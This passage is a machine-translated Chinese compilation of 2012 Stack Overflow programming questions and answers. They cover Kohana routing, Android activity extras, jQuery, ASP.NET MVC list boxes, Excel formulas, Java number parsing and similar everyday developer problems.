您的元素中不应包含“路径”属性`<Context>`：Tomcat 将使用`.xml`文件名作为上下文路径。根据其他配置，您可能必须重新启动 Tomcat 才能检测到您的更改。

# php - Kohana 路由错误

> ID：14039737
> 
> 赞同：0
> 
> 时间：2012-12-26T11:08:14.857
> 
> 标签：php, kohana-3.2

我不断收到此错误：

```
Unable to find a route to match the URI: notifications/send 
```

当我尝试访问操作发送通知时，但是当我尝试访问通知时它工作正常..

这是我的代码：

```
Route::set(
    'notifications', 
    'notifications(<action>)',
    array(
        'action' => 'index|send'
    )
)
->defaults(
    array(
        'controller' => 'notifications', 
        'action' => 'index'
    )
); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-26T11:18:52.703

您缺少一个`/`.

`notifications(<action>)`应该`notifications(/<action>)`

# android - 我无法为 singleTask 活动 Android 发送 Extra

> ID：14039738
> 
> 赞同：0
> 
> 时间：2012-12-26T11:08:20.897
> 
> 标签：android, android-activity

我在我的应用程序中使用 singleTask 活动。订购活动 A->B->C->B 我在 A 上加了额外的，然后在 B 上得到它，然后我去 C 并尝试`putExtra`B，但在 BI 上看不到它。

如果我使用 default `android:launchMode`，它可以正常工作。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-26T12:02:11.227

你必须在意图之间携带额外的东西。

A -step1-> B -step2-> C -step3-> B

**步骤1**

```
 @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
            String extraString;
        Bundle extras = getIntent().getExtras();
        if (extras == null) {
            extraString = null;
            System.out.println("null extra");
        } else {
            extraString = extras.getString("extra");
            System.out.println("from " + extraString);
        }

        Intent intent = new Intent(C.this,B.class);
            intent.putExtra("extra", extraString);
        startActivity(intent);
    }; 
```

**第2步**

```
 public void onCreate(Bundle savedInstanceState) {
            super.onCreate(savedInstanceState);
            setContentView(R.layout.activity_main);
                    String extraString,extraString2;

            Bundle extras = getIntent().getExtras();
            if (extras == null) {
                extraString = null;                             
                System.out.println("null extra");
            } else {
                   try
                       {
                   extraString = extras.getString("extra");
                   System.out.println("from " + extraString);
                       {
                       catch{}
            }

                   // CATCH EXTRA STRING2

                    if (extras == null) {
                extraString2 = null;
                System.out.println("null extra");
            } else {
                       try
                       {
                   extraString2 = extras.getString("extra2");
                   System.out.println("from " + extraString2);
                       {
                       catch{} 
            }

            Intent intent = new Intent(C.this,B.class);
                    intent.putExtra("extra", extraString);
            startActivity(intent);
        }; 
```

**第三步**

```
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);
            String extraString
    Bundle extras = getIntent().getExtras();
    if (extras == null) {
        extraString = null;
        System.out.println("null extra");
    } else {
        extraString = extras.getString("extra");
        System.out.println("from " + extraString);
    }

    Intent intent = new Intent(C.this,B.class);
            intent.putExtra("extra2", extraString);
    startActivity(intent);
}; 
```

# objective-c - 绘制 UIBezierPaths 的程序？

> ID：14039739
> 
> 赞同：2
> 
> 时间：2012-12-26T11:08:28.113
> 
> 标签：objective-c, ios, ipad, animation, uibezierpath

我在`iOS`使用过程中做了很多动画，`UIBezierPaths`并且一直在手动调整控制点，直到得到我想要的曲线。有没有我可以购买的程序，它可以让我像 PS 钢笔工具那样使用手柄调整路径，然后为我**映射**控制点，或者有没有办法在**PhotoShop**、Illustrator 等中绘制曲线并转换它莫名其妙地一个`UIBezierPath`。

我浪费了很多时间来调整这些动画，似乎必须有更好的方法。

```
UIBezierPath *runnerPath = [UIBezierPath bezierPath];
    [runnerPath moveToPoint:P(1100, 463)];
    [runnerPath addCurveToPoint:P(872, 357)
                 controlPoint1:P(967, 453)
                 controlPoint2:P(1022, 366)];
    [runnerPath addCurveToPoint:P(503, 366)
                 controlPoint1:P(664, 372)
                 controlPoint2:P(699, 480)]; 
```

* * *

* * *

**Kjuly回答**：PaintCode，完美！

![Kjuly 回答：PaintCode，完美！](../Images/1ee085ffb8a41ee0bd8bc9286c81ec0b.png)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-26T12:53:27.430

尝试[PaintCode](https://itunes.apple.com/us/app/paintcode/id507897570?mt=12)：

> 设计一个有吸引力的、与分辨率无关的用户界面很困难，尤其是在您必须编写绘图代码的情况下。PaintCode 是一个简单的矢量绘图应用程序，可立即生成与分辨率无关的 Objective-C 和 C#/MonoTouch 绘图代码。

没有尝试过，但我认为它会按您的意愿工作。

但是，如您所见，价格（99 美元）是如此之高。:$

所以在这种情况下我要做的是用不同的颜色绘制多条线，选择最好的一条线来绘制下一张。当然，最好用 Photoshop 或 GIMP 来完成。繁琐的工作。。

# html - 在页面刷新时清除 h:inputText 和 h:selectOneMenu 值

> ID：14039743
> 
> 赞同：2
> 
> 时间：2012-12-26T11:08:32.340
> 
> 标签：html, jsf, jsf-2

我有一个带有两个`<h:inputText>`文本字段和一个`<h:selectOneMenu>`下拉字段的 Facelets 页面。当我刷新页面时，应清除在文本字段中输入的值，并且应将下拉菜单重置为其默认选择。这没有发生。这是如何引起的，我该如何解决？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-26T20:51:47.437

现代网络浏览器将默认或通过配置自动完成输入字段。如果您想阻止这种浏览器特定的行为，那么您需要添加`autocomplete="off"`到各个输入字段。

```
<h:inputText ... autocomplete="off" />
<h:inputText ... autocomplete="off" />
<h:selectOneMenu ... autocomplete="off" /> 
```

### 也可以看看：

*   [W3 Web Forms 2.0 规范 -`autocomplete`属性](http://www.w3.org/Submission/web-forms2/#the-autocomplete)

# php - 使用 htmlpurifier 向标签添加属性

> ID：14039745
> 
> 赞同：3
> 
> 时间：2012-12-26T11:08:47.027
> 
> 标签：php, html, htmlpurifier

我正在尝试使用 HTMLPurifier 通过向段落添加类属性来转换 HTML。

例如，对于这个输入 HTML：

```
<p>This is a paragraph</p>
<p>Another one</p> 
```

这将是输出：

```
<p class="myclass">This is a paragraph</p>
<p class="myclass">Another one</p> 
```

我阅读了该网站上的文档和一些论坛帖子，但我无法弄清楚我应该怎么做？

提前致谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-26T11:24:07.573

这是一个快速而肮脏的示例，您可以自己测试：

```
<?php

require_once 'lib/library/HTMLPurifier.auto.php';

class HTMLPurifier_AttrTransform_AnchorClass extends HTMLPurifier_AttrTransform
{
    public function transform($attr, $config, $context)
    {
      // keep predefined class
      if (isset($attr['class']))
      {
        $attr['class'] .= ' myclass';
      }
      else
      {
        $attr['class'] = 'myclass';
      }

      return $attr;
    }
}

$dirty_html = '<a href=""></a>
<a target="_blank" href=""></a>
<a href="" class="toto"></a>
<a href="" style="oops"></a>';

$config     = HTMLPurifier_Config::createDefault();
$htmlDef    = $config->getHTMLDefinition(true);

$anchor     = $htmlDef->addBlankElement('a');
$anchor->attr_transform_post[] = new HTMLPurifier_AttrTransform_AnchorClass();

$purifier   = new HTMLPurifier($config);

$clean_html = $purifier->purify($dirty_html);

var_dump($clean_html);
It outputs:

string '<a href="" class="myclass"></a>

<a href="" class="myclass"></a>

<a href="" class="toto myclass"></a>

<a href="" class="myclass"></a>' (length=135) 
```

# php - Javascript函数中的PHP变量输出变量而不是值

> ID：14039746
> 
> 赞同：0
> 
> 时间：2012-12-26T11:08:53.063
> 
> 标签：php, javascript, jquery

我想要做的是，只有当我点击一个`div`with 时`id="$project['slug']"`，它才会加载`iframe`里面的那个`div`. 因此，我`src`从 中删除了该属性`iframe`，并将其添加到`onclick`事件中。我有这个`HTML/PHP`：

```
<div class="box" id="<?=$project['slug']?>" onclick="load_frame();">
    <iframe id="frame_<?=$project['slug']?>" frameborder="0"></iframe>
</div> 
```

`Js`：

```
function load_frame() {
    id = location.hash.replace('#', '');
    var source = "<?php echo $project['video']; ?>";
    $('#frame_'+id).attr("src", source);
} 
```

不幸的是，当我检查它时，`iframe`它显示：`src="<?=$project['video']?>"`而不是变量持有的值。你知道我做错了什么吗？谢谢你！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-26T11:12:42.520

jQuery 是一种客户端语言，只有在 DOM 元素被渲染后才能访问它们。因此，您需要做的是将`$project['video']`变量存储在隐藏字段中，然后使用该`id`字段访问渲染数据。

另外，我注意到你应该使用`<?php`而不是`<?`

你可以试试这样的。

```
<div class="box" id="<?php echo $project['slug']; ?>">
    <iframe id="frame_<?php echo $project['slug']; ?>" frameborder="0"></iframe>
    <input type="hidden" id="<?php echo $project['slug']; ?>" value="<?php echo $project['video']" />
</div> 
```

然后在jQuery中做：

```
$(document).ready(function(){
    $('.box').click(function(){
        var slug = $(this).attr('id');
        var source = $('input#' + slug).val();
        $('iframe#' + slug).attr("src", source);
    });
}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-26T11:21:20.860

在html页面上添加隐藏输入

```
 <input type="hidden" id="hidsource" value="<?php echo $project['video']" /> 
```

像这样在js中编辑你的函数

```
function load_frame() {
id = location.hash.replace('#', '');
$('#frame_'+id).attr("src", $('input#hidsource').val()); 
```

}

希望这会奏效

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-26T11:12:14.447

您可能没有在服务器上启用[速记语法。](http://php.net/manual/en/ini.core.php#ini.short-open-tag)尝试使用标准 PHP：

```
<?php echo $project['slug']; ?> 
```

# c# - 印刷画框

> ID：14039752
> 
> 赞同：2
> 
> 时间：2012-12-26T11:09:29.517
> 
> 标签：c#, winforms

当我尝试打印 a`PictureBox`时，抛出 an `ArgumentException`（参数无效）。

这是打印功能：

```
void pdGroupBox_PrintPage(object sender, PrintPageEventArgs e)
{
    foreach(Control control in _GbFrm.Controls)
        DrawControls(control, e.Graphics);
}

private void DrawControls(Control control,Graphics g)
{
    var font = new Font("Arial", 10);
    var brush = new SolidBrush(Color.Black);
    var drawFormat = new StringFormat
    {
        FormatFlags = StringFormatFlags.DirectionRightToLeft
    };

    if (control is Label)
    {
        if ((string)control.Tag == "1") //Treated with 1 columns of fields.
        {
            g.DrawString(
                control.Text, font, brush,
                new Rectangle(control.Location.X - 160, control.Location.Y, control.Size.Width + 10, control.Size.Height),
                drawFormat);
        }
        if ((string)control.Tag == "2") //Treated with 2 columns of fields.
        {
            g.DrawString(
                control.Text, font, brush,
                new Rectangle(control.Location.X - 70, control.Location.Y, control.Size.Width + 10, control.Size.Height),
                drawFormat);
        }
        if ((string)control.Tag == "3") //Treated with 3 columns of fields.
        {
            g.DrawString(
                control.Text, font, brush,
                new Rectangle(control.Location.X, control.Location.Y, control.Size.Width + 10, control.Size.Height));
        }
    }
    else if (control is TextBox || control is ComboBox)
    {
        if ((string)control.Tag == "1") //Treated with 1 columns of fields.
        {
            g.DrawRectangle(
                new Pen(Color.Black, 1),
                new Rectangle(control.Location.X - 120, control.Location.Y, control.Size.Width - 40, control.Size.Height));
            g.DrawString(
                control.Text, font, brush,
                new Rectangle(control.Location.X - 120, control.Location.Y, control.Size.Width - 40, control.Size.Height), drawFormat);
        }
        if ((string)control.Tag == "2") //Treated with 2 columns of fields.
        {
            g.DrawRectangle(
                new Pen(Color.Black, 1),
                new Rectangle(control.Location.X - 30, control.Location.Y, control.Size.Width - 40, control.Size.Height));
            g.DrawString(
                control.Text, font, brush,
                new Rectangle(control.Location.X - 30, control.Location.Y, control.Size.Width - 40, control.Size.Height),
                drawFormat);
        }
        if ((string)control.Tag == "3") //Treated with 3 columns of fields.
        {
            g.DrawRectangle(
                new Pen(Color.Black, 1),
                new Rectangle(control.Location.X, control.Location.Y, control.Size.Width, control.Size.Height));
            g.DrawString(
                control.Text, font, brush,
                new Rectangle(control.Location.X, control.Location.Y, control.Size.Width, control.Size.Height), drawFormat);
        }
    }
    else if (control is PictureBox && control.Visible)
    {
        var img = ((PictureBox)control).Image;
        var bitmap = new Bitmap(img,new Size(img.Width,img.Height));
        g.DrawImage(
            bitmap,
            new Rectangle(control.Location.X, control.Location.Y, control.Size.Width, control.Size.Height));
    }
    else if (control is DateTimePicker)
    {
        g.DrawString(
            control.Text, font, brush,
            new Rectangle(control.Location.X, control.Location.Y, control.Size.Width + 10, control.Size.Height));
    }
} 
```

所有打印问题都有效，但有时打印 a`PictureBox`会引发`Exception`问题，那么我该如何解决这个问题？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-12-26T11:42:10.563

试试这个：有点简单：

在按钮单击事件中添加以下代码：

```
PrintDocument printDocument1 = new PrintDocument();
printDocument1.PrintPage +=new PrintPageEventHandler(printDocument1_PrintPage);
printDocument1.Print(); 
```

然后是 printDocument1_PrintPage 事件：

```
private void printDocument1_PrintPage(object sender, System.Drawing.Printing.PrintPageEventArgs e)
{
    e.Graphics.DrawImage(pic.Image, 0, 0);
} 
```

其中 pic 是图片框..

这将打印图片框中的图像。

# pinterest - 从 Pinterest.com 获取所有图钉

> ID：14039756
> 
> 赞同：2
> 
> 时间：2012-12-26T11:09:47.633
> 
> 标签：pinterest, pins

我们正在开发一个网站 (php)，登录用户在该网站上查看他们的 pin 并添加到该网站。

为了获取用户 pin，我们使用 rss feed (pinterest.com//feed.rss)，但它只检索 25 个 pin，我们需要来自 pinterest 的所有 pin 用于该用户。

所以请建议我们如何做到这一点？

谢谢

Rgds Sanjay Shekhawat

# console - 我们什么时候应该使用控制台类？

> ID：14039762
> 
> 赞同：11
> 
> 时间：2012-12-26T11:10:24.013
> 
> 标签：console, java.util.scanner, bufferedreader, java-6, java-5

我正在阅读有关`Console`课程的内容，并且在第一行中，它是这样写的

> **Java 6 的新手**，当我们`Java SE 6`从命令行运行时，我们通常使用控制台类对象

那么，这意味着**我们通过命令行隐式使用控制台类？？**

然后，我开始寻找有关控制台类的更多详细信息，并在 java和[控制台](http://docs.oracle.com/javase/6/docs/api/java/io/Console.html)链接中找到[了控制台类的输入。](https://stackoverflow.com/questions/4644415/how-to-get-input-from-console-class-in-java)所以，总结了几点

> 1.  控制台类**只能在 IDE 外部**使用`System.console().readLine();`
> 2.  `Console`类**从控制台读取密码或密码短语，**使用禁用回显`readPassword()`

虽然，我们有[Scanner](http://www.java-tips.org/java-se-tips/java.util/how-to-read-input-from-console.html)类和[BufferedReader](http://docs.oracle.com/javase/1.4.2/docs/api/java/io/BufferedReader.html)类来从控制台读取输入，并且早于`Java 5`. 那么，仅由于安全原因`Console`类被添加到`Java 6`？或者是否有任何其他优势来使用这个类。

任何人都可以分享有关`Console`课程的更多详细信息吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-26T11:17:45.570

Console 类直接从进程控制台读取（在 Unix 系统中通常是 /dev/console）。控制台与 System.in 的不同之处在于它在启动命令时无法重定向。它还用于读取密码，因为从控制台读取可以控制是否回显正在键入的字符。

为了更清楚地了解这门课，请阅读 Unix 系统中的控制台和标准输入（这通常是 Unix 的东西，我不确定它如何映射到 Windows 系统）。

最后，Scanner 可以读取任何输入：文件、流或控制台本身，因此它与控制台不同。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-26T11:19:34.917

Console 类尝试实现一种独立于平台的方式来处理控制台输入。无论如何，所有操作系统都有一个控制台，但它们在实现上是完全不同的。因此，Console 类为您提供了一个独立的运行时类的 Java 平台来访问密码输入等内容。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-26T11:16:05.940

> 虚拟机是否具有控制台取决于底层平台以及调用虚拟机的方式。如果虚拟机从交互式命令行启动而不重定向标准输入和输出流，那么它的控制台将存在，并且通常会连接到启动虚拟机的键盘和显示器。如果虚拟机是自动启动的，例如通过后台作业调度程序，那么它通常不会有控制台。

[如何从 Java 中的控制台类获取输入？](https://stackoverflow.com/questions/4644415/how-to-get-input-from-console-class-in-java)

# excel - 如何在 Excel 中计算未定义的一组单元格之间的平均值？

> ID：14039768
> 
> 赞同：0
> 
> 时间：2012-12-26T11:11:11.597
> 
> 标签：excel, max, average

我有一个看起来像这样的表：

```
User         Interval  
270          new user  
270          30  
270          18  
270          7  
295          new user  
295          50  
295          30  
310          new user  
310          40  
317          new user 
```

对于每个用户，我想知道平均值和最大间隔。我的问题是我不知道如何计算仅在 2 个值之间运行的平均值`new user`，并且未设置每个用户的间隔数量。有没有办法在 Excel 中做到这一点？

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-26T11:43:57.340

正如codenut所说，您可以使用`AVERAGEIF`平均值（如果您有Excel 2007或更高版本）但没有“MAXIF”函数，因此您需要一个“数组公式”。

假设 A 列和 B 列中的数据在 C2 中尝试这个公式

`=IF(B2="New user",AVERAGE(IF(A2:A$1000=A2,B2:B$1000)),"")`

将其粘贴到 C2 中后，您需要按 F2 选择公式，然后按住 CTRL 和 SHIFT 键并按 ENTER。这将在公式栏中的公式周围放置像 { 和 } 这样的花括号 - 现在将公式复制到列下。

使用完全相同的公式重复 D2，但替换`AVERAGE`为`MAX`

您将在每个用户的顶部获得每个用户的最大值和平均值，而其他行为空白

这适用于多达 1000 行 - 如果您有更多数据，请根据需要更改公式。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-26T11:26:10.310

也许 averageif 函数可以帮助你？[http://office.microsoft.com/en-us/excel-help/averageif-function-HA010047433.aspx](http://office.microsoft.com/en-us/excel-help/averageif-function-HA010047433.aspx)

# asp.net-mvc-3 - 视图模型和验证中包含的选择列表的视图

> ID：14039774
> 
> 赞同：0
> 
> 时间：2012-12-26T11:11:39.257
> 
> 标签：asp.net-mvc-3, validation

我的场景：我的模型是“项目”，其中包含 0 个或多个税（模型“税”）

"Item" --> 有 0 或 n --> "Tax"

我有一个名为“VMItem”的 MVC 视图模型，它有一个对象为“Item”、所有税款（“TaxDic”）和选定的税款（“Taxes”）。MVC 页面绑定到此视图模型（“ViewItem”）。

要求：我希望 MVC 显示所有税款的列表框，并允许用户在创建项目时为每个项目选择相关税款。

下面是我的代码，

参考以下代码，用于Taxes的ListBox不是必填字段。但是当我在 ListBox 上提交带有一些选择的表单时，它会在 ListBox 周围显示红色框，如果我在 ListBox 上没有选择任何内容并提交，它似乎没有错误。

请看下面的场景..如果有更好的方法来实现这一点，请有人指导我。

模型

```
public class Item 
{
    [Display(Name="Item ID")]
        public virtual Guid ItemID { get; set; }

        [Required]
        [Display(Name = "Name")]
        public virtual string Name { get; set; }

        [Required]
        [Display(Name="Price")]
        public virtual decimal Price { get; set; }

        public virtual IEnumerable<Tax> Taxes { get; set; }

} 
```

查看模型

```
public class VMItem
{
    public Item Item { get; set; }
        public IEnumerable<Tax> Taxes { get; set; }
        public IEnumerable<SelectListItem> TaxDic { get; set; }
} 
```

在控制器类中生成选择列表项的函数

```
private VMItem GenerateViewModel(Item Item)
{
        IEnumerable<Tax> Taxes = TaxServices.FindAll();
        IList<SelectListItem> taxDic = new List<SelectListItem>();

        // Generating Taxes and taxDic here..

        VMItem VmItem = new VMItem
        {
            Item = Item,
            Taxes = Taxes,
            TaxDic = taxDic
        };

        return VmItem;
    } 
```

控制器动作

```
// GET: /Product/Add

public ActionResult Add()
{
    return View(GenerateViewModel(new Item()));
}

[HttpPost]
public ActionResult Add(VMItem collection)
{
    Item item = new Item();
        try
        {
         if(ModelState.IsValid)
         {
        item = collection.Item;        

        var taxes = collection.Taxes;
            return View(GenerateViewModel(collection.Item));                
             }
         // else..

    }
        // catch...
} 
```

意见

```
<% using (Html.BeginForm()) { %>

<!-- more codes for other fields -->

<%: Html.ListBoxFor(model => model.Taxes, Model.TaxDic) %>

<!-- submit button goes below -->

<% } %> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-26T13:29:23.583

这看起来像一个多对多的关系，所以首先检查您的税类是否如下所示：

```
public class Tax
{
  public Guid TaxId { get; set;}
  public virtual ICollection<Item> Items { get; set;}
} 
```

然后在上下文类的 OnModelCreating 函数中添加：

```
modelBuilder.Entity<Item>()
     .HasMany(i => i.Taxes).WithMany(t => t.Items)
     .Map(t => t.MapLeftKey("ItemId")
         .MapRightKey("TaxId")
         .ToTable("ItemsTaxes")); 
```

视图模型

```
public class ItemTaxViewModel
{
   public Item item { get; set; }
   public virtual ICollection<AssignedTaxes> Taxes { get; set; }
}

public class AssignedTaxes
{
  public int TaxId { get; set; }
  public bool Assigned { get; set; }
} 
```

控制器动作

```
public ActionResult Create()
{
   var newItemVM = new ItemTaxViewModel
          {
              Item = new Item(),
              Taxes = PopulateTaxes()
          };
    return View(newItemVM);
 }

[HttpPost]
public ActionResult Create(ItemTaxViewModel itemTaxViewModel)
{
   if(ModelState.IsValid)
   {
      var item = new Item();
      item = itemTaxViewModel.Item;
      AddOrUpdateTaxes(item, itemTaxViewModel.Taxes);
      context.Items.Add(item);
      context.SaveChanges();
      return RedirectToAction("Index");
   }
   return View(itemTaxViewModel);
} 
```

辅助方法

```
private List<AssignedTaxes> PopulateTaxes()
{
  var taxes = context.Taxes;
  var assignedTaxes = new List<AssignedTaxes>();
  foreach(var tax in taxes)
  {
    assignedTaxes.Add(new AssignedTaxes
      {
        TaxId = tax.TaxId,
        Assigned = false
      });
  }
  return assignedTaxes;
 }

 private void AddOrUpdateTaxes(Item item, ICollection<AssignedTaxes> assignedTaxes)
 {
   foreach(var assignedTax in assignedTaxes)
   {
      if(assignedTax.Assigned)
      {
         item.Taxes.Add(context.Taxes.Single(t => t.TaxId == assignedTax.TaxId));
      }
   }
  } 
```

/Views/Shared/EditorTemplates 下的 EditorTemplate

```
@model AssignedTaxes
@using projectName.ViewModels

 <fieldset>
     @Html.HiddenFor(model => model.TaxId)
     @Html.CheckBoxFor(model => model.Assigned)
 </fieldset> 
```

看法

```
<div class="editor-field">
   @Html.EditorFor(model => model.Taxes)
<div class="editor-field"> 
```

似乎需要做很多工作，但它是实现多对多复选框的最简洁方法之一，这是我在阅读了许多教程后提出的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-05T05:46:45.573

@Luis，你的方式看起来不错，但它太复杂了，最后你用复选框结束了它。可能是更好的方法。我想出了一个解决方案，这对我来说很简单。我把它贴在下面。请给我一个反馈，我是否应该继续使用它或需要改进。

控制器

```
 IEnumerable<Tax> Taxes = _TaxServices.FindTax();
        IList<SelectListItem> taxDic = new List<SelectListItem>();
        foreach (Tax tax in Taxes)
        {
            SelectListItem item = new SelectListItem();
            item.Value = tax.TaxID.ToString();
            item.Text = tax.Name;
            taxDic.Add(item);
        }

        VMItem VmItem = new VMItem
        {
            Item = Item,
            TaxDic = taxDic,
        };

        // Adding selected taxes to the list
        IList<int> SelectedTaxes = new List<int>();
        if (Item.Taxes != null && Item.Taxes.Count > 0)
        {
            foreach (Tax tax in Item.Taxes)
            {
                SelectedTaxes.Add(tax.TaxID);
            }
        }
        VmItem.SelectedTax = SelectedTaxes;

        return view(VmItem); 
```

看法

```
<%: Html.ListBoxFor(model => model.SelectedTax, Model.TaxDic) %> 
```

控制器 [HttpPost]

```
 item.Taxes = new Iesi.Collections.Generic.HashedSet<Tax>();
    if (vmItem.SelectedTax.Count() > 0)
    {
        IEnumerable<int> SelectedTaxesIDs = vmItem.SelectedTax.ToList();
        foreach (int n in SelectedTaxesIDs)
        {
            item.Taxes.Add(_TaxServices.FindTax(n));
        }
    } 
```

请对此方式进行反馈。谢谢。

# jquery - jQuerymobile：移动 safari 中的警报显示 -- file://null

> ID：14039776
> 
> 赞同：2
> 
> 时间：2012-12-26T11:11:48.643
> 
> 标签：jquery, jquery-mobile

当我在我的 html 文件中的 JQM 中放置一个警报并将其运行到移动 safari 中时，它会显示一个警报（类似于 iphone alertview）。标题显示：**file://(null)**

谁能解释一下？提前致谢

编辑：请参考下面的代码：

```
$(function() {
 $('#theButton').click(function() {
    alert('The Button has been clicked');

 });
}); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-26T13:49:14.033

您使用了不正确的 jquery 移动语法。[在这里](http://jquerymobile.com/test/docs/api/events.html)你会发现为什么***$(document).ready(function(e) {***和***$(function() {***没有在 jQuery Mobile 中使用。jQuery mobile 语法应该是这样的：

```
<script>
    $(document).live("mobileinit", function () {
        $('#index').live('pagebeforeshow',function(e,data){    
            $('#test-button').live('click', function(e) {
                alert('Button works!');
            });
        });
    });
</script> 
```

这应该没有错误标题。

看看这个小提琴示例：http: [//jsfiddle.net/Gajotres/DE4M7/](http://jsfiddle.net/Gajotres/DE4M7/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-26T14:08:42.653

尝试这个：

```
$(document).ready(function(e) {
    $('#theButton').live('click',function() {
        alert('The Button has been clicked');
    });
}); 
```

# c# - 在 jquery 中设置 DIV 标记可见性

> ID：14039777
> 
> 赞同：1
> 
> 时间：2012-12-26T11:11:49.583
> 
> 标签：c#, jquery, json.net

我的 jQuery 代码是

```
$.ajax({
        type: 'POST',
        url: "~/Pages/test.aspx",
        data: "json",
        success: function (response) {

            $('#testSpan').html(response.HasCases);

    },
        error: function (e1, e2, e3) {
            $('#testSpan').html('Error');
    }
}); 
```

我得到的响应值为 True 或 False。如果我的值为 True，我应该显示 DIV 标签值，否则我应该隐藏 DIV 标签。上面的代码在 div 文本的位置显示为 true 或 false 值:(。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-26T11:15:43.557

切换将根据布尔值显示或隐藏元素。

```
 $('#testSpan').toggle(response.HasCases); 
```

参考：

[**切换（）**](http://api.jquery.com/toggle/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-26T11:16:01.113

您可以使用 jQuery [**toggle()**](http://api.jquery.com/toggle)来实现：

```
if(response.HasCases == "true")
   $('#testSpan').toggle(); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-26T11:13:28.570

您需要使用`show()`and`hide()`而不是 html()

```
if(response.HasCases == "true")
   $('#testSpan').show();
else 
  $('#testSpan').hide(); 
```

你的代码是

```
$.ajax({
        type: 'POST',
        url: "~/Pages/test.aspx",
        data: "json",
        success: function (response) {       
          if(response.HasCases == "true")
             $('#testSpan').show();  
        }, error: function (e1, e2, e3){   
            $('#testSpan').show();           
        }
}); 
```

# android - 在应用程序购买中显示消息“您已经拥有此项目”。在安卓中

> ID：14039778
> 
> 赞同：7
> 
> 时间：2012-12-26T11:12:02.660
> 
> 标签：android, in-app-purchase

我正在尝试实现应用内。在 android 中，应用程序内运行良好。但是，当我从设备**中删除应用程序并****重新安装**时，如果我尝试购买，它会显示此消息`(product is Managed and in-app API Version 2)`

![在此处输入图像描述](../Images/119201dccf851e86a3a484f954133526.png)

在日志中，我有一个错误 `RESULT_DEVELOPER_ERROR`，然后我用谷歌搜索，我发现版本 3 有更多的响应代码，比如`BILLING_RESPONSE_RESULT_ITEM_ALREADY_OWNED`

因此，如果产品已经购买，则响应必须是 like `BILLING_RESPONSE_RESULT_ITEM_ALREADY_OWNED`，而这在版本 2 中是不可能的。

那我该怎么办？我需要实施第 3 版吗？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-01-18T05:13:22.377

**如果您想每次都**强制购买产品，那么产品应该是**Unmanaged**。

产品可以是3种类型

1) 托管

2) 非托管

3) 订阅

托管意味着谷歌它自己保存记录。因此，通过使用相同的电子邮件 ID，用户不必支付费用，例如删除广告

非托管意味着用户每次都必须购买并且需要付费。例如，Pocker 筹码

我在开发者网站上读过的这个 2 示例..

并参考[http://developer.android.com/google/play/billing/billing_admin.html](http://developer.android.com/google/play/billing/billing_admin.html)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-01-03T19:37:52.690

你调查过`RESTORE_TRANSACTIONS`吗？

我遇到了与您上面描述的几乎相同的问题。我的代码大部分取自[Market Billing Sample Application](https://developer.android.com/google/play/billing/v2/billing_integrate.html#billing-download)。

我在调用`BillingService.restoreTransactions`例程的购买活动中添加了一个 RESTORE 按钮。

`RESTORE_TRANSACTIONS`如果您在此页面中搜索： [https](https://developer.android.com/google/play/billing/v2/api.html) ://developer.android.com/google/play/billing/v2/api.html ，您会发现调用该例程会重新触发`PURCHASE_STATE_CHANGED`广播。

在我的代码中，它触发了`onPurchaseStateChange`例程，它的工作方式与初始购买`PurchaseState`时设置为`PURCHASED`.

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-01-18T11:36:59.447

我`BillingService.restoreTransactions()`在抓到后打了电话`RESULT_DEVELOPER_ERROR`。看起来很奇怪，但工作正常。

# java - 用 Java 解析一个数字

> ID：14039782
> 
> 赞同：0
> 
> 时间：2012-12-26T11:12:21.193
> 
> 标签：java, scanf

我有一个字符串，我假设它是 6 位整数的零填充表示，例如：

```
"001234" 
```

我想将其解析为 Long 对象，但我想检查它的格式是否完全相同；如果长度不是 6、不是零填充等，我想返回错误。

在 CI 中会使用 scanf 的一些变体。什么是Java方式？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-26T11:16:46.173

```
if(s.length() != 6) 
    throw new IllegalArgumentException("Input is not of length 6: " + s);
Pattern allDigits = Pattern.compile( "[0-9]+" );
if(!allDigits.matcher(s).matches()) 
    throw new IllegalArgumentException("Input is not numeric: " + s);
long val = Long.parseLong(s); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-26T11:18:10.843

此代码段可能会对您有所帮助。

```
 String test = "001234";
    long correctValue = 0;
    if (test.charAt(0) == '0' || test.length() != 6) {
        System.out.println("padded or incorrect length");

    } else {
               correctValue = Long.parseLong(test);             
    }
    System.out.println(correctValue); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-27T11:22:59.997

Aleksander Blomskøld 答案的变体：

```
Pattern allDigits = Pattern.compile("^\d{6}$");
if (!allDigits.matcher(s).matches()) 
    throw new IllegalArgumentException("Input is not numeric: " + s);
long val = Long.parseLong(s); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-12-26T11:20:41.203

试试这个，诀窍是 Long.parseLong 不接受任何尾随或前导空格，但接受前导零，因此您只需要检查长度 = 6

```
